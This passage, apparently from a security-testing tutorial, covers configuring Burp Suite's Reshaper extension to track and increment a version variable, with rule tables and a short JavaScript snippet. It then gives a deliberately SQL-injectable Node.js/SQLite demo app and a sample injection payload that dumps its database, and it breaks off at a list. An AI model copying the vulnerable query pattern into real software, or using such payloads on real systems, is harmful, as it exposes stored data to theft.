&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For the &lt;em&gt;Thens&lt;/em&gt; we configure it as follows:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;JSON&lt;/td&gt;
&lt;td&gt;data.version&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;version_variable&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;This should make sure that we have the current &lt;code&gt;version&lt;/code&gt; number stored in a variable in Burp.
However, this
must be increased by 1 because every time the &lt;code&gt;name&lt;/code&gt; parameter is updated we need
to provide a new version number.&lt;/p&gt;
&lt;p&gt;We accomplish this by using the &lt;em&gt;Evaluate&lt;/em&gt; action in Reshaper:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;X&lt;/th&gt;
&lt;th&gt;Operation&lt;/th&gt;
&lt;th&gt;Y&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Evaluate&lt;/td&gt;
&lt;td&gt;{{g:version_variable}}&lt;/td&gt;
&lt;td&gt;Add&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;version_variable_incremented&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The result should look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-example-for-setting-a-variable.png&#34; alt=&#34;reshaper-example-for-setting-a-variable&#34;&gt;&lt;/p&gt;
&lt;p&gt;And the &lt;em&gt;Evaluate&lt;/em&gt; action:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-evaluate-example.png&#34; alt=&#34;reshaper-evaluate-example&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now, when sending a request to the server with a correct version number,
two variables should be created in the &lt;em&gt;Global Variables&lt;/em&gt; sub tab of Reshaper:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-variable-set.png&#34; alt=&#34;reshaper-variable-set&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next step is to replace the &lt;code&gt;version&lt;/code&gt; key-value in subsequent requests with
the &lt;code&gt;version_variable_incremented&lt;/code&gt;. We can perform this by creating a new
rule with event direction request and by using the
&lt;em&gt;Set Value&lt;/em&gt; action according to the following image:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-using-the-variable.png&#34; alt=&#34;reshaper-using-the-variable&#34;&gt;&lt;/p&gt;
&lt;p&gt;If all steps are followed correctly every request that contains a JSON key-value
pair with the name &lt;em&gt;version&lt;/em&gt;, with data as a digit and is sent to &lt;code&gt;http://localhost:3000/user&lt;/code&gt;
will have it&amp;rsquo;s &lt;em&gt;version&lt;/em&gt; key-value replaced with our variable &lt;code&gt;version_variable_increased&lt;/code&gt;. Great success.&lt;/p&gt;
&lt;h1 id=&#34;scenario-3---using-burp-with-custom-scripting-via-reshapers-javascript-engine&#34;&gt;Scenario 3 - Using Burp with custom scripting via Reshapers JavaScript engine&lt;/h1&gt;
&lt;p&gt;This incrementation done by the &lt;em&gt;Evalute&lt;/em&gt; action done in the previous scenario
can also be perform with JavaScript. This scenarion will display the
richness and customizability by using Reshapers JavaScript engine.&lt;/p&gt;
&lt;p&gt;So instead of using the &lt;em&gt;Evaluate&lt;/em&gt; setup in the previous example we replace it
with &lt;em&gt;Run Script&lt;/em&gt;. &amp;ldquo;Script&amp;rdquo; refers to JavaScript whereas &lt;em&gt;Run Process&lt;/em&gt; can run
execute python, ruby or bash scripts stored on the file system.&lt;/p&gt;
&lt;p&gt;The following setup will use &lt;em&gt;Run Script&lt;/em&gt; instead of &lt;em&gt;Evaluate&lt;/em&gt; in the
&lt;code&gt;set_version_variable&lt;/code&gt; rules:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Whens&lt;/strong&gt;:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Request&lt;/td&gt;
&lt;td&gt;Match text&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;JSON&lt;/td&gt;
&lt;td&gt;data.version&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;version_variable&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;Thens&lt;/strong&gt;:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;JSON&lt;/td&gt;
&lt;td&gt;data.version&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;version_variable&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Instead of the &lt;em&gt;Evaluate&lt;/em&gt; action we add &lt;em&gt;Run Script&lt;/em&gt; with the following
JavaScript code:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var version = Reshaper.variables.getGlobalVariable(&amp;#34;version_variable&amp;#34;);

let verint = parseInt(version, 10);
verint += 1;

Reshaper.event.runThen(&amp;#34;SetVariable&amp;#34;,
{
    text: verint,
    useMessageValue: false,
    targetSource: &amp;#34;Global&amp;#34;,
    variableName: &amp;#34;version_variable_incremented&amp;#34;
}
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When configured it should look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-using-javascript.png&#34; alt=&#34;reshaper-using-javascript&#34;&gt;&lt;/p&gt;
&lt;p&gt;The JavaScript fetches the &lt;code&gt;version_variable&lt;/code&gt; data and converts it to an int
which is incremented and stored in a variable named &lt;code&gt;version_variable_incremented&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;By knowing how to fetch and store variables with Reshapers JavaScript Engine
opens up for unlimited flexibility.&lt;/p&gt;
&lt;h1 id=&#34;scenario-4---url-and-base64-encoding&#34;&gt;Scenario 4 - URL and base64 encoding&lt;/h1&gt;
&lt;p&gt;New scenario new possibilities. &lt;a href=&#34;https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100&#34;&gt;Hackvertor&lt;/a&gt;
is an awesome extension when is comes to converting and encoding data. All of
these action can also be done with Reshaper which will be demonstrated in
this scenario.&lt;/p&gt;
&lt;p&gt;The following node.js application code is vulnerable to SQL injection, the
caveat however is that the
input is required to be base64 encoded. Compared to previous scenarios this
demonstration application use form-urlencoding instead of JSON input to mix things up a bit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// mkdir $HOME/node-api-sqli
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// cd $HOME/node-api-sqli
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm init -y
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm install express sqlite3 body-parser
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sqlite3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sqlite3&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;verbose&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;urlencoded&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;extended&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt; }));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Initialize the in-memory SQLite database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sqlite3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Database&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:memory:&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connected to the in-memory SQLite database.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Create a users table and insert some sample data
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;(() =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL)&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INSERT INTO users (name) VALUES (&amp;#39;Alice&amp;#39;), (&amp;#39;Bob&amp;#39;), (&amp;#39;Charlie&amp;#39;)&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Middleware to decode base64 and URL encoding
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decodedData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decodeURIComponent(&lt;span style=&#34;color:#a6e22e&#34;&gt;Buffer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;from&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;decodedInput&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decodedData&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid input. Please ensure your input is base64 and URL encoded.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid input format.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Vulnerable SQL route
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/search&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`SELECT * FROM users WHERE name = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;decodedInput&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;all&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;, [], (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Error executing SQL query.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;, () =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Server running on http://localhost:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By supplying &lt;code&gt;Alice&#39; or &#39;1&#39;=1&lt;/code&gt; base64 encoded in the data parameter the full
database is dumped:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-sucessful-sql-injection.png&#34; alt=&#34;reshaper-sucessful-sql-injection&#34;&gt;&lt;/p&gt;
&lt;p&gt;This SQL injection is very trivial to exploit and much more complex payloads may be
needed in live environments. When testing and construction these payloads
it may be time consuming to base64 decode or encode at every attempt.&lt;/p&gt;
&lt;p&gt;For this we will use Reshaper to:&lt;/p&gt;
&lt;ol&gt;
